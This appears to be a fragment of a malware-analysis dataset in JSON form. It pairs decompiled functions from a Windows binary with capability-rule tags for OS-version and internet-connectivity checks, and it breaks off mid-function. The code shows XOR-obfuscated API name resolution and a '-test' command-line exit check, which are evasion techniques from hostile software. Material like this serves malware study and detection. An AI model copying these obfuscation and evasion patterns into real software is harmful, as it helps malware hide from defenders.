        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040e650(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t lpModuleName;\n    int32_t var_14h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar6 = 0;\n    var_ch = 0;\n    _var_30h = 0;\n    var_1ch = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_ch = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.0040f22d();\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41cdb0 == NULL) {\n        var_3ch = 0x141c065d;\n        var_38h = 0x14161d5b;\n        var_34h._0_2_ = 0x3714;\n        var_24h = 0x78787233;\n        var_20h._0_1_ = 0x37;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        lpModuleName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_8h = 5;\n        var_14h = &var_3ch - lpModuleName;\n        do {\n            puVar1 = iVar6 + lpModuleName;\n            iVar4 = iVar6 % 5;\n            iVar6 = iVar6 + 1;\n            *puVar1 = *(&var_24h + iVar4) ^ puVar1[&var_3ch - lpModuleName];\n        } while (iVar6 < 10);\n        var_58h = 0x2b060f3c;\n        var_54h = 0x34c5026;\n        var_50h = 0x2e023021;\n        var_4ch = 0x13253638;\n        var_48h = 0x34093d19;\n        var_44h = 0x3d23170b;\n        var_40h._0_2_ = 0x5267;\n        var_40h._2_1_ = 0x78;\n        var_24h = 0x44517866;\n        var_20h._0_1_ = 0x51;\n        uVar3 = (*pcVar2)(8, 0x1c);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = lpModuleName;\n        iVar7 = 0;\n        var_14h = &var_58h - iVar4;\n        do {\n            puVar1 = iVar7 + iVar4;\n            iVar5 = iVar7 % var_8h;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_58h - iVar4];\n        } while (iVar7 < 0x1b);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar4);\n        *0x41cdb0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        var_30h = 0;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*pcVar2)(uVar3);\n        iVar6 = var_4h;\n        in_EDX = var_1ch;\n        if (*0x41cdb0 == NULL) goto code_r0x0040e7ce;\n    }\n    iVar6 = var_4h;\n    var_30h = 0;\n    iVar4 = (**0x41cdb0)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_30h);\n    if (-1 < iVar4) {\n    }\ncode_r0x0040e7ce:\n    if (var_ch != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar6);\n    }\n    return var_30h;\n}\n",
        "token_count": 1173
    },
    "0040ebec": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040ebec(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint8_t var_3ch;\n    uint var_3bh;\n    uint var_36h;\n    ushort var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t lpLibFileName;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_2ch = 0x613b4b39;\n    var_28h = 0x4b255600;\n    var_24h._0_2_ = 0x6561;\n    lpLibFileName = 0x614b4b56;\n    var_14h._0_1_ = 0x65;\n    var_1ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_8h = 5;\n    iVar6 = var_4h;\n    do {\n        puVar1 = iVar9 + iVar6;\n        iVar6 = iVar9 % 5;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&lpLibFileName + iVar6) ^ puVar1[&var_2ch - var_4h];\n        iVar6 = var_4h;\n    } while (iVar9 < 10);\n    var_3bh._0_1_ = 5;\n    var_3ch = 0x1e;\n    var_3bh._1_2_ = 0x2e7d;\n    stack0xffffffc4 = 0x7e03;\n    var_36h._0_2_ = 0x167f;\n    var_10h = 6;\n    stack0xffffffc8 = 0x4d212306;\n    var_28h = 0x62384d4d;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x4f);\n    uVar3 = (*pcVar4)(8, 0xd);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_ch = 0;\n    do {\n        *(var_ch + lpLibFileName) = *(&var_28h + var_ch % var_8h) ^ (var_ch + lpLibFileName)[&var_3ch + -lpLibFileName];\n        var_ch = var_ch + 1;\n    } while (var_ch < 0xc);\n    var_3ch = 0x2a;\n    var_3bh._0_1_ = 0x10;\n    var_3bh._1_2_ = 0x1636;\n    stack0xffffffc4 = 0x1d3f;\n    var_36h._0_2_ = 0x1d01;\n    stack0xffffffc8 = 0x3d270f30;\n    var_30h = 0x782e;\n    var_28h = 0x7a537879;\n    var_24h._0_2_ = 0x5853;\n    uVar3 = (*pcVar4)(8, 0xf);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = lpLibFileName;\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + iVar9;\n        iVar7 = iVar8 % var_10h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_28h + iVar7) ^ puVar1[&var_3ch + -iVar9];\n    } while (iVar8 < 0xe);\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar9);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    uVar5 = (*pcVar4)(0, var_4h, var_20h, var_1ch, 0, 0);\n    if (0x20 < uVar5) {\n        uVar5 = 0;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*pcVar4)(uVar3);\n    uVar3 = (*pcVar2)(0, var_4h);\n    (*pcVar4)(uVar3);\n    return uVar5;\n}\n",
        "token_count": 1229
    },
    "0040ed7c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040ed7c(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uchar *arg_8h_00;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t *piVar8;\n    int32_t *in_EDX;\n    int32_t iVar9;\n    int32_t *piVar10;\n    int32_t iVar11;\n    code *pcVar12;\n    int32_t iVar13;\n    uchar *puVar14;\n    uint var_a8h;\n    uint var_a0h;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint32_t var_70h;\n    int32_t *var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    ushort var_44h;\n    uint var_42h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_68h = 0;\n    var_5ch = 0;\n    var_50h = 0;\n    var_48h._0_1_ = 0x5d;\n    var_54h = 6;\n    var_48h._1_1_ = 6;\n    var_48h._2_2_ = 0x141c;\n    var_44h = 0x1d5b;\n    var_42h._0_2_ = 0x1416;\n    var_42h._2_2_ = 0x3714;\n    var_8h = 0x78787233;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x37);\n    var_6ch = in_EDX;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    var_64h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar13 = 0;\n    var_60h = &var_48h - var_64h;\n    do {\n        var_10h = 0x5;\n        puVar1 = iVar13 + var_64h;\n        iVar9 = iVar13 % 5;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[var_60h];\n    } while (iVar13 < 10);\n    var_34h = 0x391e203f;\n    var_30h._0_2_ = 0x7d41;\n    var_30h._2_1_ = 0x51;\n    var_30h._3_1_ = 6;\n    var_2ch = 0x3244333c;\n    var_28h = 0x392f392c;\n    var_24h = 0x23042644;\n    var_20h = 0x1b583920;\n    var_1ch = 0x332a3817;\n    var_18h = 0x63533845;\n    var_14h._0_1_ = 0x49;\n    var_8h = 0x56495765;\n    var_4h._0_2_ = 0x4b36;\n    uVar5 = (*pcVar12)(8, 0x22);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar13 = var_64h;\n    var_ch = NULL;\n    do {\n        piVar10 = var_ch + 1;\n        *(var_ch + iVar9) = *(&var_8h + var_ch % var_54h) ^ (var_ch + iVar9)[&var_34h - iVar9];\n        var_ch = piVar10;\n    } while (piVar10 < 0x21);\n    var_60h = iVar9;\n    if ((*0x41d228 & 1) == 0) {\n        *0x41d228 = *0x41d228 | 1;\n        *0x41d224 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_64h);\n    }\n    if ((*0x41d228 & 2) == 0) {\n        *0x41d228 = *0x41d228 | 2;\n        *0x41d220 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41d224, iVar9);\n    }\n    if (*0x41d224 == 0) {\n        *0x41d224 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar13);\n    }\n    if (*0x41d220 == NULL) {\n        var_34h = 0x391e203f;\n        var_30h._0_2_ = 0x7d41;\n        var_30h._2_1_ = 0x51;\n        var_30h._3_1_ = 6;\n        var_2ch = 0x3244333c;\n        var_28h = 0x392f392c;\n        var_24h = 0x23042644;\n        var_20h = 0x1b583920;\n        var_1ch = 0x332a3817;\n        var_18h = 0x63533845;\n        var_14h._0_1_ = 0x49;\n        var_8h = 0x56495765;\n        var_4h._0_2_ = 0x4b36;\n        uVar5 = (*pcVar12)(8, 0x22);\n        iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        iVar9 = 0;\n        var_10h = &var_34h - iVar13;\n        do {\n            puVar1 = iVar9 + iVar13;\n            iVar11 = iVar9 % var_54h;\n            iVar9 = iVar9 + 1;\n            *puVar1 = *(&var_8h + iVar11) ^ (&var_34h - iVar13)[puVar1];\n        } while (iVar9 < 0x21);\n        *0x41d220 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41d224, iVar13);\n        uVar5 = (*pcVar12)(0, iVar13);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        iVar13 = var_64h;\n        iVar9 = var_60h;\n    }\n    fcn.0040f276();\n    if ((*0x41d220 != NULL) && (iVar11 = (**0x41d220)(var_4ch, 0, &var_a8h, 0x30, &var_58h),  -1 < iVar11)) {\n        uVar5 = (*pcVar12)(8, 0x200);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        if (var_10h != NULL) {\n            uVar5 = (*pcVar12)(8, 0x100);\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n            if (((iVar11 != 0) && (var_58h = fcn.0040e650(iVar11, 0x28),  var_58h != 0)) &&\n               (var_58h = fcn.0040e650(iVar11 + 0x28, 0x40),  arg_8h_00 = var_10h,  var_58h != 0)) {\n                var_54h = *(iVar11 + 0x18) + 0x10;\n                var_44h = *(iVar11 + 0x3c);\n                var_42h._0_2_ = *(iVar11 + 0x3c) >> 0x10;\n                var_8h = *(iVar11 + 0x1c) + (0xffffffef < *(iVar11 + 0x18));\n                var_ch = var_6ch + 2;\n                iVar3 = *(iVar11 + 0x38);\n                var_48h._0_1_ = iVar3;\n                var_48h._1_1_ = iVar3 >> 8;\n                var_48h._2_2_ = iVar3 >> 0x10;\n                var_50h = 4;\n                if ((iVar3 != var_54h) || (*(iVar11 + 0x3c) != var_8h)) {\n                    do {\n                        var_58h = fcn.0040e650(iVar11 + 0x68, 0x98);\n                        iVar13 = var_64h;\n                        iVar9 = var_60h;\n                        if (var_58h == 0) break;\n                        var_78h = *(iVar11 + 0x68);\n                        var_74h = *(iVar11 + 0x6c);\n                        var_48h._0_1_ = var_78h;\n                        var_48h._1_1_ = var_78h >> 8;\n                        var_48h._2_2_ = var_78h >> 0x10;\n                        var_50h = var_50h + 0x120;\n                        var_44h = var_74h;\n                        var_42h._0_2_ = var_74h >> 0x10;\n                        if (var_50h <= arg_8h) {\n                            uVar6 = *(iVar11 + 0xb0) >> 1;\n                            *(var_ch + 6) = var_5ch;\n                            var_ch[5] = *(iVar11 + 0xd0);\n                            *(var_ch + 7) = *(iVar11 + 0xd4);\n                            var_ch[4] = *(iVar11 + 0xa8);\n                            var_ch[2] = *(iVar11 + 0x98);\n                            var_ch[3] = *(iVar11 + 0x9c);\n                            puVar14 = arg_8h_00;\n                            for (iVar13 = 0x200; iVar13 != 0; iVar13 = iVar13 + -1) {\n                                *puVar14 = 0;\n                                puVar14 = puVar14 + 1;\n                            }\n                            var_70h = uVar6;\n                            if ((uVar6 < 0x100) && (var_58h = fcn.0040e650(arg_8h_00, *(iVar11 + 0xb0)),  var_58h != 0))\n                            {\n                                uVar7 = 0;\n                                if (uVar6 != 0) {\n                                    do {\n                                        *(uVar7 + 0x20 + var_ch) = arg_8h_00[uVar7 * 2];\n                                        uVar7 = uVar7 + 1;\n                                    } while (uVar7 < uVar6);\n                                }\n                                *(uVar6 + 0x20 + var_ch) = 0;\n                                piVar8 = NULL;\n                                piVar10 = var_ch + 8;\n                                do {\n                                    cVar2 = *piVar10;\n                                    if (cVar2 == '\\\\') {\n                                        piVar8 = piVar10;\n                                    }\n                                    piVar10 = piVar10 + 1;\n                                } while (cVar2 != '\\0');\n                                *(var_ch + 0x1e) = (piVar8 - var_ch) + -0x1f;\n                            }\n                            var_ch = var_ch + 0x48;\n                            var_5ch = var_5ch + 1;\n                        }\n                    } while ((var_78h != var_54h) || (iVar13 = var_64h,  iVar9 = var_60h,  var_74h != var_8h));\n                }\n                if (var_6ch != NULL) {\n                    *var_6ch = var_5ch;\n                }\n            }\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            pcVar12 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar11 != 0) {\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_50h;\n    }\n    if ((var_50h <= arg_8h) && (var_50h != 0)) {\n        var_68h = 1;\n    }\n    uVar5 = (*pcVar12)(0, iVar9);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar12)(0, iVar13);\n    (*pcVar4)(uVar5);\n    return var_68h;\n}\n",
        "token_count": 3112
    },
    "0040f618": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040f618(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    if ((*0x41cdb8 | *0x41cdbc) == 0) {\n        var_30h = 0x141c065d;\n        var_2ch = 0x14161d5b;\n        var_28h._0_1_ = 0x14;\n        var_28h._1_1_ = 0x37;\n        var_24h = 0x78787233;\n        var_20h._0_1_ = 0x37;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_4h = 5;\n        iVar8 = 0;\n        var_1ch = &var_30h - var_8h;\n        do {\n            puVar1 = iVar8 + var_8h;\n            iVar4 = iVar8 % 5;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_24h + iVar4) ^ puVar1[&var_30h - var_8h];\n        } while (iVar8 < 10);\n        var_38h = 0x3275102c;\n        var_34h = 0x5c083538;\n        var_30h = 0x130e2923;\n        var_2ch = 0x133e3f66;\n        var_28h._0_1_ = 6;\n        var_28h._1_1_ = 0x56;\n        var_28h._2_1_ = 0x57;\n        var_24h = 0x57326776;\n        var_20h._0_1_ = 0x4c;\n        uVar3 = (*pcVar6)(8, 0x14);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = var_8h;\n        iVar7 = 0;\n        var_14h = iVar4;\n        var_1ch = &var_38h - iVar4;\n        do {\n            puVar1 = iVar7 + iVar4;\n            iVar5 = iVar7 % var_4h;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_38h - iVar4];\n        } while (iVar7 < 0x13);\n        *0x41cdb8 = fcn.0040eb1d(iVar4);\n        if (*0x41cdb8 == 0) {\n            uVar3 = (*pcVar6)(0, iVar4);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar6)(0, iVar8);\n            (*pcVar2)(uVar3);\n            goto code_r0x0040f995;\n        }\n        var_38h = 0x7362108;\n        var_34h = 0xb391100;\n        var_30h = 0x222a1116;\n        var_2ch = 0x37060a31;\n        var_28h._0_1_ = 0x37;\n        var_28h._1_1_ = 1;\n        var_28h._2_1_ = 0x62;\n        var_24h = 0x62655652;\n        var_20h._0_1_ = 0x74;\n        uVar3 = (*pcVar6)(8, 0x14);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = var_8h;\n        iVar4 = 0;\n        do {\n            puVar1 = iVar4 + var_10h;\n            iVar7 = iVar4 % var_4h;\n            iVar4 = iVar4 + 1;\n            *puVar1 = *(&var_24h + iVar7) ^ puVar1[&var_38h - var_10h];\n        } while (iVar4 < 0x13);\n        *0x41cdc0 = fcn.0040eb1d(var_10h);\n        iVar4 = var_14h;\n        if (*0x41cdc0 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_38h = 0x97a3f0b;\n            var_34h = 0x52210705;\n            var_30h = 0x1b373a1f;\n            var_2ch = 0x38010b52;\n            var_28h._0_1_ = 0x27;\n            var_28h._1_1_ = 0x59;\n            var_28h._2_1_ = 0x68;\n            var_24h = 0x68374851;\n            var_20h._0_1_ = 0x75;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n            var_18h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar8 = var_8h;\n            iVar4 = 0;\n            do {\n                puVar1 = iVar4 + var_18h;\n                iVar7 = iVar4 % var_4h;\n                iVar4 = iVar4 + 1;\n                *puVar1 = *(&var_24h + iVar7) ^ puVar1[&var_38h - var_18h];\n            } while (iVar4 < 0x13);\n            *0x41cdc8 = fcn.0040eb1d(var_18h);\n            iVar4 = var_14h;\n            if (*0x41cdc8 == 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n            }\n            else {\n                var_50h = 0x2370411;\n                var_4ch = 0x34032a04;\n                var_48h._0_1_ = 5;\n                stack0xffffffb5 = 0x43c3c0c;\n                var_43h = 0x7280c3f;\n                var_3fh = 0x4b07030b;\n                var_2ch = 0x6c62734b;\n                var_28h._0_1_ = 0x69;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n                var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar8 = var_8h;\n                iVar4 = 0;\n                do {\n                    puVar1 = iVar4 + var_1ch;\n                    iVar7 = iVar4 % var_4h;\n                    iVar4 = iVar4 + 1;\n                    *puVar1 = *(&var_2ch + iVar7) ^ puVar1[&var_50h - var_1ch];\n                } while (iVar4 < 0x15);\n                *0x41cdd0 = fcn.0040eb1d(var_1ch);\n                iVar4 = var_14h;\n                if (*0x41cdd0 != 0) {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n                    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n                    (*pcVar6)(uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n                    (*pcVar6)(uVar3);\n                    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*pcVar6)(uVar3);\n                    uVar3 = (*pcVar2)(0, iVar8);\n                    (*pcVar6)(uVar3);\n                    goto code_r0x0040f990;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n            }\n            (*pcVar6)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n        }\n        (*pcVar6)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar6)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar8);\n        (*pcVar6)(uVar3);\n    }\n    else {\ncode_r0x0040f990:\n        var_ch = 0x41cdb8;\n    }\ncode_r0x0040f995:\n    *0x41cdd4 = *0x41cdd0 >> 0x20;\n    *0x41cdcc = *0x41cdc8 >> 0x20;\n    *0x41cdc4 = *0x41cdc0 >> 0x20;\n    *0x41cdbc = *0x41cdb8 >> 0x20;\n    return var_ch;\n}\n",
        "token_count": 2479
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    code *pcVar5;\n    uint uVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    uint var_280h;\n    uint hHeap;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uchar var_30h;\n    uint var_2fh;\n    uchar var_2bh;\n    uint var_28h;\n    uint8_t var_24h;\n    uint var_23h;\n    uint var_1eh;\n    ushort var_18h;\n    uchar var_16h;\n    uchar *var_14h;\n    uchar *var_10h;\n    uchar *lpLibFileName;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    hHeap = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar5)(uVar3 | 2);\n    var_10h = 0x5;\n    var_23h._0_1_ = 5;\n    var_24h = 0x1e;\n    var_23h._1_2_ = 0x2e7d;\n    stack0xffffffdc = 0x7e03;\n    var_1eh._0_2_ = 0x167f;\n    var_7ch = 6;\n    stack0xffffffe0 = 0x4d212306;\n    var_8h = 0x62384d4d;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x4f);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    do {\n        puVar1 = iVar11 + lpLibFileName;\n        iVar9 = iVar11 % var_10h;\n        iVar11 = iVar11 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_24h + -lpLibFileName];\n    } while (iVar11 < 0xc);\n    var_28h = 0x1d073620;\n    var_24h = 0xf;\n    var_23h._0_1_ = 0x5b;\n    var_23h._1_2_ = 0x1507;\n    stack0xffffffdc = 0x1e03;\n    var_1eh._0_2_ = 0x610b;\n    stack0xffffffe0 = 0x1718180c;\n    var_18h = 0x6218;\n    var_16h = 99;\n    var_8h = 0x706a5963;\n    var_4h._0_2_ = 0x356e;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = lpLibFileName;\n    iVar12 = 0;\n    do {\n        puVar1 = iVar12 + iVar9;\n        iVar10 = iVar12 % var_7ch;\n        iVar12 = iVar12 + 1;\n        *puVar1 = *(&var_8h + iVar10) ^ puVar1[&var_28h - iVar9];\n    } while (iVar12 < 0x13);\n    puVar13 = &var_280h;\n    for (iVar12 = 0x200; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar11, iVar9);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineW)();\n    (*pcVar5)(uVar4, &hHeap);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    lpLibFileName = puVar7;\n    iVar11 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(uVar4, L\"-test\");\n    if (iVar11 == 0) goto code_r0x004019f2;\n    uVar4 = 0x4df;\n    while( true ) {\n        while( true ) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(uVar4);\ncode_r0x004019f2:\n            puVar8 = puVar7;\n            for (iVar11 = 0x208; iVar11 != 0; iVar11 = iVar11 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            iVar11 = 0;\n            (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, puVar7, 0x104);\n            *0x41cad8 = puVar7;\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            puVar7 = fcn.00403c33();\n            (*_sym.imp.KERNEL32.dll_GetVersion)();\n            if 